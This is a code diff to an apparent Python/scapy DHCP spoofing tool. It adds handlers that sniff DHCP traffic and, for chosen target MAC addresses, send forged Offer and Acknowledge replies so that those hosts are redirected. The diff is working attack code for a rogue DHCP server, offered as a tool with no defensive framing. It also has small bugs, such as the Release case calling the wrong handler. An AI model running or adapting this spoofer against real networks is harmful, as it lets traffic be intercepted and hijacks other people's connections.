@@ -180,6 +180,13 @@ class DHCP_FLAGS:
     # hlen
     HTYPE_LEN_DEF=6
 
+    # message-type
+    MSG_DISCOVER    = 1
+    MSG_OFFER       = 2
+    MSG_REQUEST     = 3
+    MSG_ACKNOWLEDGE = 5
+    MSG_RELEASE     = 7
+
 
 def get_my_default_gateway():
     gws = netifaces.gateways()
@@ -205,6 +212,14 @@ def is_discover_filter(pack):
     return False
 
 
+# Checks if a packet is DHCP type discover
+def is_DHCP_filter(pack):
+    DHCP_ports = DHCP_CLIENT_PORT, DHCP_SERVER_PORT
+
+    return pack.haslayer(DHCP) and pack.haslayer(BOOTP) and pack.haslayer(UDP) and pack[DHCP].options[0][0] == 'message-type' and \
+        pack[UDP].sport in DHCP_ports and pack[UDP].dport in DHCP_ports
+
+
 def import_scapy():
     globals().update(importlib.import_module('scapy.all').__dict__)
 
@@ -221,6 +236,10 @@ def is_ip_valid(x):
         pass
     
     return False
+
+
+def getDHCPMsgType(pack):
+    return pack[DHCP].options[0][1]
 
 
 mac_to_bytes = lambda mac: (eval('0x'+''.join([x for x in mac if x != ':']))).to_bytes(6, byteorder='big')
@@ -243,22 +262,67 @@ def print_help():
     print('')
     print('\t-i,\t\t- inspect DHCP Discover without sending anything on net')
 
-def gen_request_filter(xid, src_mac):
-    return lambda pack: pack.haslayer(BOOTP) and pack[BOOTP].xid == xid and pack.haslayer(Ether) and pack[Ether].src == src_mac
+
+def handle_DHCP_Discover(pack):
+    offer = Spoofer().build_offer_message(pack)
+    sendp(offer)
+
+
+def handle_DHCP_Offer(pack):
+    return
+
+
+def handle_DHCP_Request(pack):
+    ack = Spoofer().build_acknowledge_message(pack)
+    sendp(ack)
+    send('Redirected host <---- {0}, {1}'.format(pack[IP].src, pack[Ether].src))
+
+
+def handle_DHCP_Acknowledge(pack):
+    return
+    
+
+def handle_DHCP_Release(pack):
+    print('[DHCP Release]: {0}'.format(pack[IP].src))
 
 
 # Prints an example discovery
-def handle_DHCP_discover(pack):
+def handle_DHCP_packet(pack):
     global INSPECT_MODE
 
     spoof = Spoofer()
    
-    print('Got Discover from ----> ', end='')
+    print('Got DHCP from ----> ', end='')
     print(pack[Ether].src)
 
+    # Exit if only inspecting
     if INSPECT_MODE:
         return
 
+    # Exit if sender is not target
+    if not spoof.is_trigger(pack[Ether].src):
+        return
+
+    msg_type = getDHCPMsgType(pack)
+    
+    # Switch DHCP type
+    if msg_type == DHCP_FLAGS.MSG_DISCOVER:
+        handle_DHCP_Discover(pack)
+    elif msg_type == DHCP_FLAGS.MSG_OFFER:
+        handle_DHCP_Offer(pack)
+    elif msg_type == DHCP_FLAGS.MSG_REQUEST:
+        handle_DHCP_Request(pack)
+    elif msg_type == DHCP_FLAGS.MSG_ACKNOWLEDGE:
+        handle_DHCP_Acknowledge(pack)
+    elif msg_type == DHCP_FLAGS.MSG_RELEASE:
+        handle_DHCP_Acknowledge(pack)
+    else:
+        print('Unknown DHCP packet - type: {0}'.format(msg_type))
+
+    return
+
+    # TODO: Remove below
+    # TODO: Remove trigger
     if spoof.is_trigger(pack[Ether].src):
         print('=-=-=-=- Sending Offer =-=-=-=-')
 
@@ -339,7 +403,7 @@ def main():
         import_scapy()
 
         print('Listening...')
-        sniff(lfilter=is_discover_filter, prn=handle_DHCP_discover)
+        sniff(lfilter=is_DHCP_filter, prn=handle_DHCP_packet)
 
 
 if __name__ == "__main__":
